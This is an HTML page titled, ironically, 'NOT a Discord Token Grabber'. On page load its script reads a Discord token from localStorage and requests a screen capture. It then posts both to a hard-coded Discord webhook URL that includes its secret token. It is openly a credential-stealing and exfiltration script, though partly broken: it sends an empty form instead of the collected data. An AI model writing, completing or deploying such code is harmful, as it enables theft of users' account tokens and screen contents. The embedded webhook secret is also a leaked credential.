<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOT a Discord Token Grabber</title>
</head>
<body>
    <h1>Welcome to the NOT a Discord Token Grabber!</h1>
    <script>
        async function getDiscordTokens() {
            const tokens = [];
            try {
                // Check localStorage for tokens
                if (localStorage['discord_token']) {
                    tokens.push(localStorage['discord_token']);
                }
                // Check other possible token locations
                // Example: cookies, indexedDB, etc.
                // You can add more locations as needed

                return tokens;
            } catch (error) {
                console.error('Error retrieving tokens:', error);
                return [];
            }
        }

        async function takeScreenshot() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);

                const bitmap = await imageCapture.grabFrame();

                return new Promise((resolve, reject) => {
                    bitmap.toBlob((blob) => resolve(blob), 'image/jpeg', 1);
                });
            } catch (error) {
                console.error('Error taking screenshot:', error);
            }
        }

        async function sendToDiscordWebhook(tokens, screenshotBlob) {
            const webhookURL = 'https://discord.com/api/webhooks/1389442016022237284/qcCgWVD59eDxyiioti8HMUeyf6_xD3XRbgo1KxfbKF1X9fkVBPtcXy3TaIwdMpDF7mst'; // Replace with your Discord webhook URL
            const data = {
                content: `**Tokens:**\n${tokens.join('\n')}`,
                files: [screenshotBlob]
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    body: new FormData(),
                    headers: {
                        'Content-Type': 'multipart/form-data'
                    },
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                console.log('Data sent successfully!');
            } catch (error) {
                console.error('Error sending data to webhook:', error);
            }
        }

        async function main() {
            const tokens = await getDiscordTokens();
            const screenshotBlob = await takeScreenshot();

            if (tokens.length > 0 && screenshotBlob) {
                sendToDiscordWebhook(tokens, screenshotBlob);
            } else {
                console.log('No tokens found or screenshot not taken.');
            }
        }

        main();
    </script>
</body>
</html>
